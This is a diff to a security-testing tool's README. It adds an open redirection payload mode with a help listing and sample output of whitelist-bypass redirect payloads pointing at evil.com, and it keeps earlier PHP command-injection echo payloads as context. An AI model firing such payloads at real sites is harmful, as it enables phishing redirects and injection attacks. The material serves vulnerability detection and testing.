@@ -4,7 +4,7 @@ Payload Generator Tool. These payloads are only help to detect the vulnerability
 - [x] XSS Payload Generation
 - [ ] SSTI Payload Generation
 - [ ] HTML Injection Payload Generation
-- [ ] Open Redirection Payload Generation
+- [x] Open Redirection Payload Generation
 - [ ] SQL Injection Payload Generation
 - [ ] Command Injection Payload Generation
 - [ ] SSI Injection Payload Generation
@@ -97,3 +97,54 @@ system("echo PLmyJkJgSdo5iQ9lDAnH");
 <?php system("echo PLmyJkJgSdo5iQ9lDAnH"); ?>
 [...]
 ```
+
+
+## Open Redirection (ORED)
+
+### Help
+
+```bash
+usage: generator.py ored [-h] [--oast-domain] [--unique-string] [--whitelisted-domain] [--xss-payloads] [--urlencode]
+
+options:
+  -h, --help            show this help message and exit
+
+Open Redirection Payload Options:
+  --oast-domain         Set OAST Domain for payloads
+  --unique-string       Set Unique String for testing
+  --whitelisted-domain 
+                        Set Whitelisted domain for testing
+  --xss-payloads        Generate XSS Payloads
+
+Open Redirection Payload Mutations:
+  --urlencode           Set URL Encoding for payload generator
+```
+
+### Generate Payloads
+
+```bash
+python3 generator.py ored --oast-domain evil.com --whitelisted-domain github.com
+/〱evil.com
+〱evil.com
+/〵evil.com
+〵evil.com
+/ゝevil.com
+ゝevil.com
+/ーevil.com
+ーevil.com
+/ｰevil.com
+ｰevil.com
+/%09/evil.com
+//%09/evil.com
+///%09/evil.com
+////%09/evil.com
+/%09/evil.com@evil.com
+//%09/evil.com@evil.com
+///%09/evil.com@evil.com
+////%09/evil.com@evil.com
+/%09/github.com@evil.com
+//%09/github.com@evil.com
+///%09/github.com@evil.com
+////%09/github.com@evil.com
+```
+
